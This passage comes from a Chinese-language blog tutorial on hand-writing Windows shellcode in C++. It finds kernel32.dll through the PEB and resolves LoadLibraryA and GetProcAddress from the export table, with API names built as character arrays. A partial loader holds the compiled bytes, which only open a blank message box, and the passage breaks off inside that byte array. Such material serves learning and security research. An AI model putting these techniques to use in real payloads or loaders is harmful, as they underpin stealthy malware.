<p>可能这样理解会比较困难，不妨看看流程图：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240213215357651.png" alt="image-20240213215357651"></p>
<p>这样就可以获取kernel32.dll的加载地址，然后使用我们自实现的GetProcAddress（具体可以看本人博客PE结构学习中导出表的部分），就可以获取到LoadLibraryA和GetProcAddress函数了。</p>
<p>Myshellcode.cpp：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;MyConfig.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span>* <span class="title">getPebAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span>* peb;</span><br><span class="line"></span><br><span class="line">	__asm &#123;</span><br><span class="line">		mov eax, fs: [<span class="number">0x18</span>] ;</span><br><span class="line">		mov eax, [eax + <span class="number">0x30</span>];</span><br><span class="line">		mov peb, eax;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> peb;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">wclen</span><span class="params">(<span class="type">wchar_t</span>* str)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++) &#123;</span><br><span class="line">		len++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">wccmp</span><span class="params">(<span class="type">wchar_t</span>* str1, <span class="type">wchar_t</span>* str2)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> len1 = <span class="built_in">wclen</span>(str1);</span><br><span class="line">	<span class="type">int</span> len2 = <span class="built_in">wclen</span>(str2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (len1 == len2) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len1; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (str1[i] != str2[i]) &#123;</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">HMODULE <span class="title">getDllAddress</span><span class="params">(<span class="type">wchar_t</span>* dllname)</span> </span>&#123;</span><br><span class="line">	PPEB ppeb = (PPEB)<span class="built_in">getPebAddress</span>();</span><br><span class="line">	PPEB_LDR_DATA pldr = ppeb-&gt;Ldr;</span><br><span class="line"></span><br><span class="line">	PLDR_DATA_TABLE_ENTRY ppldr = (PLDR_DATA_TABLE_ENTRY)pldr-&gt;InLoadOrderModuleList.Flink;</span><br><span class="line">	<span class="keyword">while</span> (ppldr-&gt;InLoadOrderLinks.Flink != pldr-&gt;InLoadOrderModuleList.Flink) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">wccmp</span>(ppldr-&gt;BaseDllName.Buffer, dllname)) &#123;</span><br><span class="line">			<span class="keyword">return</span> (HMODULE)ppldr-&gt;DllBase;</span><br><span class="line">		&#125;</span><br><span class="line">		ppldr = (PLDR_DATA_TABLE_ENTRY)ppldr-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">FARPROC</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">MyNameGetProcAddress</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ LPCSTR lpProcName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pIMAGE_DOS_HEADER = (PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">	PIMAGE_NT_HEADERS pIMAGE_NT_HEADERS = (PIMAGE_NT_HEADERS)(pIMAGE_DOS_HEADER-&gt;e_lfanew + (DWORD)hModule);</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY pIMAGE_EXPORT_DIRECTORY = (PIMAGE_EXPORT_DIRECTORY)(pIMAGE_NT_HEADERS-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress + (DWORD)hModule);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 对比函数名称</span></span><br><span class="line">	DWORD* NameAddress = (DWORD*)(pIMAGE_EXPORT_DIRECTORY-&gt;AddressOfNames + (DWORD)hModule);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; pIMAGE_EXPORT_DIRECTORY-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">		<span class="type">char</span>* FuncName = (<span class="type">char</span>*)(NameAddress[i] + (DWORD)hModule);</span><br><span class="line">		<span class="comment">// printf(&quot;%s\n&quot;, FuncName);</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 如果对比成功</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(FuncName, lpProcName)) &#123;</span><br><span class="line">			<span class="comment">// 找到对应名称序号表中的内容</span></span><br><span class="line">			WORD* NameOrdinalAddress = (WORD*)(pIMAGE_EXPORT_DIRECTORY-&gt;AddressOfNameOrdinals + (DWORD)hModule);</span><br><span class="line">			WORD NameOrdinal = NameOrdinalAddress[i];</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 找到函数地址表中对应的内容</span></span><br><span class="line">			DWORD* FuncAddress = (DWORD*)(pIMAGE_EXPORT_DIRECTORY-&gt;AddressOfFunctions + (DWORD)hModule);</span><br><span class="line">			DWORD Func = FuncAddress[NameOrdinal] + (DWORD)hModule;</span><br><span class="line">			<span class="keyword">return</span> (FARPROC)Func;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">wchar_t</span> kernel32Str[] = &#123; <span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">char</span> loadLibraryAStr[] = &#123; <span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;A&#x27;</span>, <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">char</span> getProcAddressStr[] = &#123; <span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">char</span> user32dllStr[] = &#123; <span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">char</span> messageBoxStr[] = &#123; <span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	HMODULE kernel32dll = <span class="built_in">getDllAddress</span>(kernel32Str);</span><br><span class="line">	pLoadLibraryA myLoadLibraryA = (pLoadLibraryA)<span class="built_in">MyNameGetProcAddress</span>(kernel32dll, loadLibraryAStr);</span><br><span class="line">	pGetProcAddress myGetProcAddress = (pGetProcAddress)<span class="built_in">MyNameGetProcAddress</span>(kernel32dll, getProcAddressStr);</span><br><span class="line"></span><br><span class="line">	HMODULE user32dll = <span class="built_in">myLoadLibraryA</span>(user32dllStr);</span><br><span class="line">	pMessageBoxA myMessageBoxA = (pMessageBoxA)<span class="built_in">myGetProcAddress</span>(user32dll, messageBoxStr);</span><br><span class="line">	<span class="built_in">myMessageBoxA</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Myconfig.h：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> </span></span><br><span class="line"><span class="function"><span class="params">(WINAPI *pMessageBoxA)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_opt_ HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_opt_ LPCSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_opt_ LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ UINT uType)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span></span></span><br><span class="line"><span class="function"><span class="params">(WINAPI *pLoadLibraryA)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPCSTR lpLibFileName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span></span></span><br><span class="line"><span class="function"><span class="params">(WINAPI *pGetProcAddress)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPCSTR lpProcName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PEB_LDR_DATA</span> &#123;</span><br><span class="line">    ULONG Length;                                                           <span class="comment">//0x0</span></span><br><span class="line">    UCHAR Initialized;                                                      <span class="comment">//0x4</span></span><br><span class="line">    VOID* SsHandle;                                                         <span class="comment">//0x8</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> InLoadOrderModuleList;                               <span class="comment">//0xc</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> InMemoryOrderModuleList;                             <span class="comment">//0x14</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> InInitializationOrderModuleList;                     <span class="comment">//0x1c</span></span><br><span class="line">    VOID* EntryInProgress;                                                  <span class="comment">//0x24</span></span><br><span class="line">    UCHAR ShutdownInProgress;                                               <span class="comment">//0x28</span></span><br><span class="line">    VOID* ShutdownThreadId;                                                 <span class="comment">//0x2c</span></span><br><span class="line">&#125; PEB_LDR_DATA, * PPEB_LDR_DATA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PEB</span> &#123;</span><br><span class="line">    BYTE Reserved1[<span class="number">2</span>];</span><br><span class="line">    BYTE BeingDebugged;</span><br><span class="line">    BYTE Reserved2[<span class="number">1</span>];</span><br><span class="line">    PVOID Reserved3[<span class="number">2</span>];</span><br><span class="line">    PPEB_LDR_DATA Ldr;</span><br><span class="line">&#125; PEB, * PPEB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> &#123;</span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PWSTR  Buffer;</span><br><span class="line">&#125; UNICODE_STRING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LDR_DATA_TABLE_ENTRY</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> InLoadOrderLinks;                                    <span class="comment">//0x0</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> InMemoryOrderLinks;                                  <span class="comment">//0x8</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> InInitializationOrderLinks;                          <span class="comment">//0x10</span></span><br><span class="line">    VOID* DllBase;                                                          <span class="comment">//0x18</span></span><br><span class="line">    VOID* EntryPoint;                                                       <span class="comment">//0x1c</span></span><br><span class="line">    ULONG SizeOfImage;                                                      <span class="comment">//0x20</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> FullDllName;                                     <span class="comment">//0x24</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> BaseDllName;                                     <span class="comment">//0x2c</span></span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure>

<p>成功弹窗！接下来就是将我们的C代码导出为shellcode，总结做的工作有以下几点：</p>
<ul>
<li>修改程序的入口</li>
<li>调整编译版本为Release</li>
<li>运行库改为静态（多线程&#x2F;MT）</li>
<li>关闭安全检查（&#x2F;GS-）</li>
<li>方便调试可以关闭编译优化</li>
<li>将程序入口函数放到文件开头，并声明其他函数防止找不到标识符</li>
</ul>
<p>最后写一个加载器对shellcode进行加载：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*func)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> hexData[<span class="number">4096</span>] = &#123;</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0x8B</span>, <span class="number">0xEC</span>, <span class="number">0x83</span>, <span class="number">0xEC</span>, <span class="number">0x68</span>, <span class="number">0xB8</span>, <span class="number">0x4B</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0x98</span>, <span class="number">0xB9</span>,</span><br><span class="line">    <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x4D</span>, <span class="number">0x9A</span>,</span><br><span class="line">    <span class="number">0xBA</span>, <span class="number">0x52</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x55</span>,</span><br><span class="line">    <span class="number">0x9C</span>, <span class="number">0xB8</span>, <span class="number">0x4E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0x45</span>, <span class="number">0x9E</span>, <span class="number">0xB9</span>, <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x4D</span>, <span class="number">0xA0</span>, <span class="number">0xBA</span>, <span class="number">0x4C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x55</span>, <span class="number">0xA2</span>, <span class="number">0xB8</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xA4</span>, <span class="number">0xB9</span>, <span class="number">0x32</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x4D</span>, <span class="number">0xA6</span>, <span class="number">0xBA</span>, <span class="number">0x2E</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x55</span>, <span class="number">0xA8</span>, <span class="number">0xB8</span>,</span><br><span class="line">    <span class="number">0x44</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xAA</span>,</span><br><span class="line">    <span class="number">0xB9</span>, <span class="number">0x4C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x4D</span>,</span><br><span class="line">    <span class="number">0xAC</span>, <span class="number">0xBA</span>, <span class="number">0x4C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0xAE</span>, <span class="number">0x33</span>, <span class="number">0xC0</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xB0</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xC4</span>, <span class="number">0x4C</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xC5</span>, <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xC6</span>, <span class="number">0x61</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xC7</span>, <span class="number">0x64</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xC8</span>, <span class="number">0x4C</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xC9</span>, <span class="number">0x69</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xCA</span>, <span class="number">0x62</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xCB</span>, <span class="number">0x72</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xCC</span>, <span class="number">0x61</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xCD</span>, <span class="number">0x72</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xCE</span>, <span class="number">0x79</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xCF</span>, <span class="number">0x41</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xD0</span>, <span class="number">0x00</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xB4</span>, <span class="number">0x47</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xB5</span>, <span class="number">0x65</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xB6</span>, <span class="number">0x74</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xB7</span>, <span class="number">0x50</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xB8</span>, <span class="number">0x72</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xB9</span>, <span class="number">0x6F</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xBA</span>, <span class="number">0x63</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xBB</span>, <span class="number">0x41</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xBC</span>, <span class="number">0x64</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xBD</span>, <span class="number">0x64</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xBE</span>, <span class="number">0x72</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xBF</span>, <span class="number">0x65</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xC0</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xC1</span>, <span class="number">0x73</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xC2</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xE0</span>, <span class="number">0x75</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xE1</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xE2</span>, <span class="number">0x65</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xE3</span>, <span class="number">0x72</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xE4</span>, <span class="number">0x33</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xE5</span>, <span class="number">0x32</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xE6</span>, <span class="number">0x2E</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xE7</span>, <span class="number">0x64</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xE8</span>, <span class="number">0x6C</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xE9</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xEA</span>, <span class="number">0x00</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xD4</span>, <span class="number">0x4D</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xD5</span>, <span class="number">0x65</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xD6</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xD7</span>, <span class="number">0x73</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xD8</span>, <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xD9</span>, <span class="number">0x67</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xDA</span>, <span class="number">0x65</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xDB</span>, <span class="number">0x42</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xDC</span>, <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xDD</span>, <span class="number">0x78</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xDE</span>, <span class="number">0x57</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0xDF</span>, <span class="number">0x00</span>, <span class="number">0x8D</span>, <span class="number">0x4D</span>, <span class="number">0x98</span>, <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0xE8</span>, <span class="number">0x23</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x83</span>, <span class="number">0xC4</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xFC</span>, <span class="number">0x8D</span>, <span class="number">0x55</span>, <span class="number">0xC4</span>, <span class="number">0x52</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x45</span>, <span class="number">0xFC</span>, <span class="number">0x50</span>, <span class="number">0xE8</span>, <span class="number">0x70</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xF8</span>, <span class="number">0x8D</span>, <span class="number">0x4D</span>, <span class="number">0xB4</span>, <span class="number">0x51</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0xFC</span>, <span class="number">0x52</span>, <span class="number">0xE8</span>, <span class="number">0x60</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xF0</span>, <span class="number">0x8D</span>, <span class="number">0x45</span>, <span class="number">0xE0</span>, <span class="number">0x50</span>, <span class="number">0xFF</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0xF8</span>, <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xF4</span>, <span class="number">0x8D</span>, <span class="number">0x4D</span>, <span class="number">0xD4</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0x8B</span>, <span class="number">0x55</span>, <span class="number">0xF4</span>, <span class="number">0x52</span>, <span class="number">0xFF</span>, <span class="number">0x55</span>, <span class="number">0xF0</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xEC</span>, <span class="number">0x6A</span>, <span class="number">0x00</span>, <span class="number">0x6A</span>, <span class="number">0x00</span>, <span class="number">0x6A</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x6A</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x55</span>, <span class="number">0xEC</span>, <span class="number">0x8B</span>, <span class="number">0xE5</span>,</span><br><span class="line">    <span class="number">0x5D</span>, <span class="number">0xC3</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0x8B</span>, <span class="number">0xEC</span>, <span class="number">0x51</span>, <span class="number">0x64</span>, <span class="number">0xA1</span>, <span class="number">0x18</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8B</span>, <span class="number">0x40</span>, <span class="number">0x30</span>, <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xFC</span>,</span><br><span class="line">    <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0xFC</span>, <span class="number">0x8B</span>, <span class="number">0xE5</span>, <span class="number">0x5D</span>, <span class="number">0xC3</span>, <span class="number">0xCC</span>,</span><br><span class="line">    <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0x8B</span>, <span 